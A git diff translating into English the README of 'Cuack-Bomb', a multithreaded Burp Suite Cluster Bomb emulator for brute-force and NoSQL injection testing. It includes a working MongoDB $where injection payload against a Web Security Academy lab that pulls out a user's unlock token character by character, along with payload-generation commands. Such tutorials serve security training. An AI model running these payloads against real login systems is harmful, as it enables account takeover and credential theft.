@@ -1,65 +1,65 @@
-# 🚀 Cuack-Bomb - Cluster Bomb Emulator para Burp Suite
+# 🚀 Cuack-Bomb - Cluster Bomb Emulator for Burp Suite
 
-**Cuack-Bomb** es un emulador de Cluster Bomb de Burp Suite, diseñado para ser **ultrarrápido, universal y automático**. Permite ejecutar ataques de fuerza bruta con inyección NoSQL y otros payloads, procesando miles de combinaciones en segundos en lugar de horas.
-
----
-
-## 📋 Características
-
-✅ **Velocidad extrema** - 30+ hilos concurrentes, hasta 50x más rápido que Burp Suite  
-✅ **Universal** - Funciona con cualquier request.txt de Burp, sin modificar  
-✅ **Auto-detección** - Detecta automáticamente la palabra clave de éxito  
-✅ **HTTP/2 + HTTP/1.1** - Soporte completo para ambos protocolos  
-✅ **Payloads flexibles** - Soporta archivos `.txt` y listas inline (ej: `§1,2,3§`)  
-✅ **CSV nativo** - Resultados guardados en formato CSV para análisis en Excel  
-✅ **Sin dependencias pesadas** - Solo usa `requests` y librerías estándar  
+**Cuack-Bomb** is a Cluster Bomb emulator for Burp Suite, designed to be **ultra-fast, universal, and automatic**. It allows you to perform brute-force attacks with NoSQL injection and other payloads, processing thousands of combinations in seconds instead of hours.
 
 ---
 
-## 🛠️ Instalación
+## 📋 Features
+
+✅ **Extreme speed** - 30+ concurrent threads, up to 50x faster than Burp Suite  
+✅ **Universal** - Works with any Burp request.txt, no modification needed  
+✅ **Auto-detection** - Automatically detects the success keyword  
+✅ **HTTP/2 + HTTP/1.1** - Full support for both protocols  
+✅ **Flexible payloads** - Supports `.txt` files and inline lists (e.g., `§1,2,3§`)  
+✅ **Native CSV** - Results saved in CSV format for Excel analysis  
+✅ **No heavy dependencies** - Only uses `requests` and standard libraries  
+
+---
+
+## 🛠️ Installation
 
 ```bash
 git clone https://github.com/tuusuario/cuack-bomb.git
 cd cuack-bomb
 pip install requests
-o
+or
 sudo apt install python3-requests
 ```
 
 ---
 
-## 📂 Estructura del Proyecto
+## 📂 Project Structure
 
 ```
 cuack-bomb/
-├── cluster-bomb.py      # Script principal
-├── request.txt           # Petición de Burp con marcadores §
-├── pos.txt              # Payloads para posición 1 (ej: números)
-├── char.txt             # Payloads para posición 2 (ej: caracteres)
-├── resultados.csv       # Resultados del ataque (se genera)
-└── README.md            # Este archivo
+├── cluster-bomb.py      # Main script
+├── request.txt           # Burp request with § markers
+├── pos.txt              # Payloads for position 1 (e.g., numbers)
+├── char.txt             # Payloads for position 2 (e.g., characters)
+├── resultados.csv       # Attack results (generated)
+└── README.md            # This file
 ```
 
 ---
 
-## 🎯 Uso Rápido
+## 🎯 Quick Usage
 
 ```bash
-# Uso básico (con detección automática de palabra clave)
+# Basic usage (with automatic keyword detection)
 python cluster-bomb.py request.txt
 
-# Especificando archivo de salida
+# Specifying output file
 python cluster-bomb.py request.txt resultados.csv
 
-# Con palabra clave específica
+# With specific keyword
 python cluster-bomb.py request.txt resultados.csv "Account locked"
 ```
 
 ---
 
-## 📝 Formato del Archivo `request.txt`
+## 📝 Format of the `request.txt` File
 
-El archivo debe ser exportado directamente desde Burp Suite, **sin modificaciones**:
+The file must be exported directly from Burp Suite, **without modifications**:
 
 ```http
 POST /login HTTP/2
@@ -71,16 +71,16 @@ Cookie: session=...
 {"username":"carlos","password":{"$ne":"invalid"},"$where":"this.unlockToken.match('^.{§pos.txt§}§char.txt§.*')"}
 ```
 
-**Los marcadores `§`** indican dónde se insertarán las payloads:
-- `§pos.txt§` → Carga payloads desde el archivo `pos.txt`
-- `§char.txt§` → Carga payloads desde el archivo `char.txt`
-- También soporta listas inline: `§0,1,2,3,4,5§`
+**The `§` markers** indicate where payloads will be inserted:
+- `§pos.txt§` → Loads payloads from the file `pos.txt`
+- `§char.txt§` → Loads payloads from the file `char.txt`
+- Also supports inline lists: `§0,1,2,3,4,5§`
 
 ---
 
-## 📄 Archivos de Payloads
+## 📄 Payload Files
 
-### `pos.txt` - Posiciones del token
+### `pos.txt` - Token positions
 ```
 0
 1
@@ -105,7 +105,7 @@ Cookie: session=...
 20
 ```
 
-### `char.txt` - Caracteres posibles
+### `char.txt` - Possible characters
 ```
 a
 b
@@ -131,25 +131,25 @@ _
 
 ---
 
-## 📊 Análisis de Resultados
+## 📊 Results Analysis
 
-### Salida en consola:
+### Console output:
 ```
-[14:00:30] [INFO] === INICIANDO CLUSTER BOMB EMULATOR ===
-[14:00:30] [INFO] Encontrados 2 marcadores en la petición
-[14:00:30] [INFO] Total de combinaciones: 1472
-[14:00:30] [INFO] Enviando 1472 peticiones con 30 hilos...
-  Progreso: 1472/1472 (100.0%)
-[14:01:19] [INFO] Completado en 48.65 segundos
-[14:01:19] [SUCCESS] Palabra clave detectada: 'Account locked'
-[14:01:19] [SUCCESS] ✅ Encontradas 23 peticiones con 'Account locked'
+[14:00:30] [INFO] === STARTING CLUSTER BOMB EMULATOR ===
+[14:00:30] [INFO] Found 2 markers in the request
+[14:00:30] [INFO] Total combinations: 1472
+[14:00:30] [INFO] Sending 1472 requests with 30 threads...
+  Progress: 1472/1472 (100.0%)
+[14:01:19] [INFO] Completed in 48.65 seconds
+[14:01:19] [SUCCESS] Keyword detected: 'Account locked'
+[14:01:19] [SUCCESS] ✅ Found 23 requests with 'Account locked'
 [14:01:19] [INFO]   ID 60: 0|8 -> Account locked
 [14:01:19] [INFO]   ID 118: 1|2 -> Account locked
 [14:01:19] [INFO]   ID 129: 2|b -> Account locked
 ...
 ```
 
-### Archivo CSV generado (`resultados.csv`):
+### Generated CSV file (`resultados.csv`):
 ```csv
 combination_id,combination,status_code,response_length,response_time,contains_Account_locked,response_preview
 60,0|8,200,3500,0.85,True,"<!DOCTYPE html> <html> <!--LAB_HEAD_START--> ..."
@@ -158,34 +158,34 @@ combination_id,combination,status_code,response_length,response_time,contains_Ac
 
 ---
 
-## 🔍 Detección Automática de Palabra Clave
+## 🔍 Automatic Keyword Detection
 
-Cuack-Bomb detecta automáticamente la palabra clave de éxito comparando:
-1. Patrones comunes: `Account locked`, `Invalid`, `Error`, `Success`, `Welcome`
-2. Diferencias en longitud de respuesta
-3. Diferencias en el contenido textual
+Cuack-Bomb automatically detects the success keyword by comparing:
+1. Common patterns: `Account locked`, `Invalid`, `Error`, `Success`, `Welcome`
+2. Differences in response length
+3. Differences in textual content
 
-**También puedes especificarla manualmente:**
+**You can also specify it manually:**
 ```bash
 python cluster-bomb.py request.txt resultados.csv "Invalid username"
 ```
 
 ---
 
-## ⚡ Rendimiento Comparativo
+## ⚡ Comparative Performance
 
-| Herramienta | Peticiones | Tiempo | Velocidad |
+| Tool | Requests | Time | Speed |
 |-------------|------------|--------|-----------|
-| Burp Suite (Cluster Bomb) | 1,472 | ~4 horas | 0.1 req/seg |
-| **Cuack-Bomb** | 1,472 | **~49 segundos** | **30 req/seg** |
+| Burp Suite (Cluster Bomb) | 1,472 | ~4 hours | 0.1 req/sec |
+| **Cuack-Bomb** | 1,472 | **~49 seconds** | **30 req/sec** |
 
-**¡50x más rápido!** 🚀
+**50x faster!** 🚀
 
 ---
 
-## 🎯 Ejemplo Práctico: Extraer Token NoSQL
+## 🎯 Practical Example: Extract NoSQL Token
 
-1. **Exporta la petición de Burp**:
+1. **Export the Burp request**:
 ```http
 POST /login HTTP/1.1
 Host: 0a7b00ed04ed3cae809108c100df00f4.web-security-academy.net
@@ -194,44 +194,44 @@ Content-Type: application/json
 {"username":"carlos","password":{"$ne":"invalid"},"$where":"this.unlockToken.match('^.{§pos.txt§}§char.txt§.*')"}
 ```
 
-2. **Crea los archivos de payloads**:
+2. **Create the payload files**:
 ```bash
-# pos.txt - números 0-20
+# pos.txt - numbers 0-20
 for i in {0..20}; do echo $i >> pos.txt; done
 
-# char.txt - caracteres posibles
+# char.txt - possible characters
 echo "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-" | fold -w1 > char.txt
 ```
 
-3. **Ejecuta el ataque**:
+3. **Run the attack**:
 ```bash
 python cluster-bomb.py request.txt
 ```
 
-4. **Analiza los resultados**:
-Los IDs con `Account locked` te mostrarán el token carácter por carácter:
+4. **Analyze the results**:
+The IDs with `Account locked` will show you the token character by character:
 ```
-ID 60: 0|8 -> Account locked   # Posición 0 = '8'
-ID 118: 1|2 -> Account locked  # Posición 1 = '2'
-ID 129: 2|b -> Account locked  # Posición 2 = 'b'
+ID 60: 0|8 -> Account locked   # Position 0 = '8'
+ID 118: 1|2 -> Account locked  # Position 1 = '2'
+ID 129: 2|b -> Account locked  # Position 2 = 'b'
 ...
 Token: 82bbaad259
 ```
 
 ---
 
-## 🛠️ Configuración Avanzada
+## 🛠️ Advanced Configuration
 
-### Ajustar número de hilos
+### Adjust number of threads
 ```python
 emulator = BurpClusterBombEmulator(
     request_file="request.txt",
-    max_workers=50,  # Más hilos = más rápido
-    timeout=5        # Timeout por petición
+    max_workers=50,  # More threads = faster
+    timeout=5        # Timeout per request
 )
 ```
 
-### Usar listas inline (sin archivos)
+### Use inline lists (without files)
 ```http
 {"username":"carlos","$where":"this.token.match('^.{§0,1,2,3,4,5,6,7,8,9§}§a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z§.*')"}
 ```
@@ -240,41 +240,41 @@ emulator = BurpClusterBombEmulator(
 
 ## 🐛 Troubleshooting
 
-### Error: "No se encontraron marcadores §"
-Asegúrate de que el cuerpo de la petición contenga `§` marcando las posiciones de las payloads.
+### Error: "No § markers found"
+Make sure the request body contains `§` marking the payload positions.
 
-### Error: "No se encontró Host en las cabeceras"
-Verifica que el archivo `request.txt` incluya la cabecera `Host:`.
+### Error: "No Host found in headers"
+Verify that the `request.txt` file includes the `Host:` header.
 
-### Todas las peticiones devuelven 500
-- Revisa la sintaxis de tu payload (especialmente JSON)
-- Verifica que la cookie de sesión sea válida
-- Asegúrate de que los archivos de payloads no tengan caracteres especiales
-
----
-
-## 📜 Licencia
-
-MIT License - Libre para uso educativo y profesional.
+### All requests return 500
+- Check your payload syntax (especially JSON)
+- Verify that the session cookie is valid
+- Make sure the payload files do not contain special characters
 
 ---
 
-## 🤝 Contribuciones
+## 📜 License
 
-¡Las contribuciones son bienvenidas! Si encuentras un bug o quieres añadir una feature:
-1. Fork el proyecto
-2. Crea tu rama (`git checkout -b feature/AmazingFeature`)
-3. Commit tus cambios (`git commit -m 'Add AmazingFeature'`)
-4. Push a la rama (`git push origin feature/AmazingFeature`)
-5. Abre un Pull Request
+MIT License - Free for educational and professional use.
 
 ---
 
-## 📞 Contacto
+## 🤝 Contributions
+
+Contributions are welcome! If you find a bug or want to add a feature:
+1. Fork the project
+2. Create your branch (`git checkout -b feature/AmazingFeature`)
+3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
+4. Push to the branch (`git push origin feature/AmazingFeature`)
+5. Open a Pull Request
+
+---
+
+## 📞 Contact
 
 - **GitHub**: [@akthanon](https://github.com/akthanon)
-- **Issues**: [Reportar bug](https://github.com/akthanon/cuack-bomb/issues)
+- **Issues**: [Report bug](https://github.com/akthanon/cuack-bomb/issues)
 
 ---
 
-**Hecho con ❤️ gracias a Deepseek para la comunidad de seguridad ofensiva**
+**Made with ❤️ thanks to Deepseek for the offensive security community**
